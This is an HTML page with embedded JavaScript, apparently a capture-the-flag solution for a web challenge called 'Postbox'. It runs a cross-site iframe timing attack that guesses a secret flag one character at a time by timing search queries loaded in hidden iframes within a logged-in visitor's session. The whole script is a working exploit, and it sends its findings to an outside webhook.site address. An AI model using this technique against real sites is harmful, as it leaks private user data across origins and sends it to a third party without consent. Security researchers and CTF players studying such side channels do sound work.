<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>Postbox iframe timing oracle</title>
<body><pre id="status">Running iframe timing measurements…</pre>
<script>
"use strict";

const WEBHOOK = "https://webhook.site/6ec1ed3f-8c2e-467b-bf24-2a02c70fa9ba";
const DEFAULT_APP = "https://8afaa9f6487405da.postbox.best";
const params = new URLSearchParams(location.search);
const prefix = params.get("p") || "flag{";
const rid = params.get("rid") || crypto.randomUUID();
const app = params.get("app") || DEFAULT_APP;
const alphabet = [...new Set(params.get("cs") || "}0123456789abcdef")];
const screenSamples = Math.max(1, Math.min(7, Number.parseInt(params.get("n") || "1", 10)));
const verifyRounds = Math.max(1, Math.min(8, Number.parseInt(params.get("v") || "2", 10)));
const shortlistSize = Math.max(1, Math.min(4, Number.parseInt(params.get("top") || "3", 10)));
const batchSize = Math.max(1, Math.min(6, Number.parseInt(params.get("k") || "3", 10)));
const status = document.getElementById("status");

const median = values => {
  const sorted = [...values].sort((a, b) => a - b);
  const mid = Math.floor(sorted.length / 2);
  return sorted.length % 2 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
};
const deviation = (values, center) => median(values.map(value => Math.abs(value - center)));

function targetUrl(query) {
  const url = new URL(app);
  url.search = "";
  url.searchParams.set("q", query);
  url.searchParams.set("sort", "asc");
  url.searchParams.set("probe", Math.random().toString(36).slice(2));
  return url.href;
}

function loadFrame(query) {
  return new Promise(resolve => {
    const frame = document.createElement("iframe");
    frame.style.cssText = "position:absolute;width:2px;height:2px;left:-20px;top:-20px";
    const started = performance.now();
    let finished = false;
    const timer = setTimeout(() => finish("timeout"), 7000);

    function finish(error = "") {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      let childFrames = -1;
      try { childFrames = frame.contentWindow.length; } catch (_) {}
      const result = {
        ms: performance.now() - started,
        childFrames,
        error,
      };
      frame.remove();
      resolve(result);
    }

    frame.onload = () => finish();
    frame.onerror = () => finish("load-error");
    frame.src = targetUrl(query);
    document.body.appendChild(frame);
  });
}

async function loadBatch(query) {
  const frames = await Promise.all(
    Array.from({ length: batchSize }, () => loadFrame(query))
  );
  return {
    ms: frames.reduce((sum, frame) => sum + frame.ms, 0),
    frames,
    timedOut: frames.some(frame => frame.error),
    unauthenticated: frames.some(frame => frame.childFrames === 0),
  };
}

async function pairedDelta(candidateQuery, round) {
  const baselineQuery = prefix + "\u0003";
  let candidate, baseline;
  if (round % 2 === 0) {
    [candidate, baseline] = await Promise.all([
      loadBatch(candidateQuery), loadBatch(baselineQuery)
    ]);
  } else {
    [baseline, candidate] = await Promise.all([
      loadBatch(baselineQuery), loadBatch(candidateQuery)
    ]);
  }
  return { delta: candidate.ms - baseline.ms, candidate, baseline };
}

async function send(data) {
  const scores = data.samples
    ? Object.entries(data.samples)
        .map(([char, sample]) => ({ char, score: sample.score }))
        .sort((a, b) => b.score - a.score)
        .slice(0, 6)
    : (data.top || []);
  const payload = {
    rid,
    prefix,
    winner: data.winner || "",
    error: data.error || "",
    baseline: data.baseline,
    threshold: data.threshold,
    top: JSON.stringify(scores),
  };
  const url = new URL(WEBHOOK);
  for (const [key, value] of Object.entries(payload)) {
    if (value !== undefined && value !== null) url.searchParams.set(key, String(value));
  }
  url.searchParams.set("_", String(Date.now()));
  try {
    await fetch(url.href, {
      method: "GET",
      mode: "no-cors",
      credentials: "omit",
      cache: "no-store",
      keepalive: true,
    });
  } catch (_) {}
}

(async () => {
  const baselineQuery = prefix + "\u0003";
  const baselineRuns = [];
  const samples = {};

  const authCheck = await loadFrame(baselineQuery);
  if (authCheck.childFrames === 0) {
    await send({ error: "report bot is not authenticated to the app" });
    status.textContent = "Bot is not authenticated.";
    return;
  }

  for (let i = 0; i < 2; i++) {
    const baseline = await loadBatch(baselineQuery);
    if (baseline.timedOut || baseline.unauthenticated) {
      await send({ error: baseline.unauthenticated
        ? "report bot is not authenticated to the app"
        : "baseline iframe timed out" });
      status.textContent = "Baseline measurement failed.";
      return;
    }
    baselineRuns.push(baseline.ms);
  }

  const shuffled = [...alphabet];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }

  for (let index = 0; index < shuffled.length; index++) {
    const char = shuffled[index];
    const deltas = [];
    for (let sample = 0; sample < screenSamples; sample++) {
      const pair = await pairedDelta(prefix + char, index + sample);
      if (pair.candidate.timedOut || pair.baseline.timedOut ||
          pair.candidate.unauthenticated || pair.baseline.unauthenticated) {
        await send({ error: "candidate iframe failed", samples });
        status.textContent = "Candidate measurement failed.";
        return;
      }
      deltas.push(pair.delta);
      baselineRuns.push(pair.baseline.ms);
    }
    samples[char] = { deltas, score: median(deltas) };
  }

  const ranked = Object.entries(samples).sort((a, b) => b[1].score - a[1].score);
  const finalists = ranked.slice(0, Math.min(shortlistSize, ranked.length));
  for (const [char, sample] of finalists) {
    for (let round = 0; round < verifyRounds; round++) {
      const pair = await pairedDelta(prefix + char, screenSamples + round);
      if (pair.candidate.timedOut || pair.baseline.timedOut ||
          pair.candidate.unauthenticated || pair.baseline.unauthenticated) {
        await send({ error: "verification iframe failed", samples });
        status.textContent = "Verification failed.";
        return;
      }
      sample.deltas.push(pair.delta);
      baselineRuns.push(pair.baseline.ms);
    }
    sample.score = median(sample.deltas);
  }

  const baseline = median(baselineRuns);
  const threshold = Math.max(8, baseline * 0.005, deviation(baselineRuns, baseline) * 0.25);
  const verified = finalists
    .filter(([, sample]) => sample.score >= threshold &&
      sample.deltas.filter(value => value > threshold * 0.35).length >=
        Math.ceil(sample.deltas.length / 2))
    .sort((a, b) => b[1].score - a[1].score);

  let winner = null;
  if (verified.length &&
      (verified.length === 1 || verified[0][1].score - verified[1][1].score >= threshold * 0.5)) {
    winner = verified[0][0];
  }

  await send({
    winner,
    baseline,
    threshold,
    samples,
  });
  status.textContent = winner
    ? `Measurement complete for ${prefix}.`
    : `No clear candidate for ${prefix}.`;
})();
</script>
</body>
</html>
